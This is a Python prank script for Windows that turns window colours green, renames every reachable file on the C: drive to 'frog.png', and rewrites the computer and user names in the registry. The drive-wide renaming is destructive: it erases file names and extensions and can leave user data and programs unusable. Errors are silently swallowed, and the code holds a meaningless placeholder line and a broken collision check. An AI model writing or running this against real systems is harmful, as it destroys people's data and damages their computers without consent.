import os
import winreg
import ctypes

print("[FROG MODE ACTIVATED]")

# --- 1. THE GREENING (Change Windows Colors) ---
def set_color():
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Colors", 0, winreg.KEY_WRITE)
        # Set window background to BRIGHT GREEN
        winreg.SetValueEx(reg_key, "Window", 0, winreg.REG_SZ, "100 255 100")
        winreg.SetValueEx(reg_key, "AppWorkSpace", 0, winreg.REG_SZ, "0 255 0")
        winreg.CloseKey(reg_key)
        print("[*] Windows turned Green.")
    except:
        pass

# --- 2. RENAME EVERY FILE TO FROG.PNG ---
def rename_files():
    # Walk through the whole C: drive
    for folder, subfolders, files in os.walk("C:/"):
        # Skip the folder containing this script to keep it alive
        if folder == os.path.dirname(os.path.abspath(__file__)):
            continue
            
        for filename in files:
            # Rename file to frog.png (removing original extension)
            new_name = "frog.png"
            old_path = os.path.join(folder, filename)
            new_path = os.path.join(folder, new_name)
            
            try:
                # If frog.png already exists, add a number to it so we don't crash
                if os.path.exists(new_path):
                    new_name = f"frog_{os.getpid()}.png" 
                    new_path = os.path.join(folder, new_name)
                os.rename(old_path, new_path)
            except:
                pass # Ignore files locked by windows
    print("[*] All files are now frogs.")

# --- 3. RENAME USER AND COMPUTER ---
def takeover_identity():
    try:
        # Change Computer Name
        os.rename = os.rename # Just a placeholder, real way:
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "ComputerName", 0, winreg.REG_SZ, "FROG")
        winreg.CloseKey(reg_key)
        
        # Change User Name
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "USERNAME", 0, winreg.REG_SZ, "Frog")
        winreg.CloseKey(reg_key)
        
        print("[*] You are now Frog.")
    except:
        pass

# --- EXECUTE ---
set_color()
rename_files()
takeover_identity()

# Optional: Beep 5 times
for _ in range(5):
    os.system("echo bell") 
    print("\a") # ASCII bell character

print("\n[!] THE PC IS NOW YOURS. IT IS ALL FROG.")
input("Press Enter to end...")
